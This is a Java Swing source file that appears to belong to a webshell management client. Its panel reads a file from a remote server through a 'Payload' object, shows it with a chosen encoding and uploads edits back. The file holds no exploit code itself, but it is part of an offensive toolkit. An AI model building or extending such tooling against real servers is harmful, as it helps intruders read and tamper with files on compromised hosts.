package vip.youwe.shell.core.ui.component;

import vip.youwe.shell.core.ApplicationContext;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class ShellRSFilePanel extends JPanel {

    private JComboBox<String> encodingComboBox;
    private JButton saveButton;
    private JButton refreshButton;
    private JButton backButton;
    private JTextField readFileTextField;
    private RTextArea fileDataTextArea;
    private JPanel parentPanel;
    private Payload payload;
    private CardLayout cardLayout;
    private JSplitPane splitPane;
    private byte[] fileData;
    private String containerName;
    private JPanel topPanel;
    private JScrollPane scrollPane;
    private String encodingTypeString;

    public ShellRSFilePanel(Payload payload, JPanel parentPanel, String containerName) {
        super(new BorderLayout());
        this.parentPanel = parentPanel;
        this.cardLayout = (CardLayout) parentPanel.getLayout();
        this.containerName = containerName;
        this.payload = payload;
        this.topPanel = new JPanel();
        this.encodingComboBox = new JComboBox(ApplicationContext.getAllEncodingTypes());
        this.saveButton = new JButton("保存");
        this.refreshButton = new JButton("刷新");
        this.backButton = new JButton("返回");
        this.splitPane = new JSplitPane();
        this.readFileTextField = new JTextField(30);
        this.fileDataTextArea = new RTextArea();
        this.scrollPane = new JScrollPane(this.fileDataTextArea);
        this.topPanel.add(this.readFileTextField);
        this.topPanel.add(this.encodingComboBox);
        this.topPanel.add(this.saveButton);
        this.topPanel.add(this.refreshButton);
        this.topPanel.add(this.backButton);
        this.splitPane.setOrientation(0);
        this.splitPane.setTopComponent(this.topPanel);
        this.splitPane.setBottomComponent(this.scrollPane);
        this.encodingComboBox.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent paramActionEvent) {
                if (ShellRSFilePanel.this.fileData != null) {
                    ShellRSFilePanel.this.encodingTypeString = (String) ShellRSFilePanel.this.encodingComboBox.getSelectedItem();
                    ShellRSFilePanel.this.refreshData();
                }
            }
        });
        automaticBindClick.bindJButtonClick(this, this);
        this.encodingTypeString = (String) this.encodingComboBox.getSelectedItem();
        add(this.splitPane);
    }

    public void rsFile(String file) {
        this.readFileTextField.setText(file);
        this.fileData = this.payload.downloadFile(file);
        refreshData();
    }

    private void refreshData() {
        try {
            this.fileDataTextArea.setText(new String(this.fileData, this.encodingTypeString));
        } catch (Exception e) {
            this.fileDataTextArea.setText(new String(this.fileData));
            Log.error(e);
        }
    }

    public void saveButtonClick(ActionEvent e) {
        String fileString = this.readFileTextField.getText();
        boolean uploadState = this.payload.uploadFile(fileString, functions.stringToByteArray(this.fileDataTextArea.getText(), this.encodingTypeString));
        if (uploadState) {
            JOptionPane.showMessageDialog(this, "保存成功", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this, "保存失败", "提示", 2);
        }
    }

    public void refreshButtonClick(ActionEvent e) {
        rsFile(this.readFileTextField.getText());
    }

    public void backButtonClick(ActionEvent e) {
        this.fileData = null;
        this.fileDataTextArea.setText("");
        this.readFileTextField.setText("");
        this.cardLayout.show(this.parentPanel, this.containerName);
    }
}
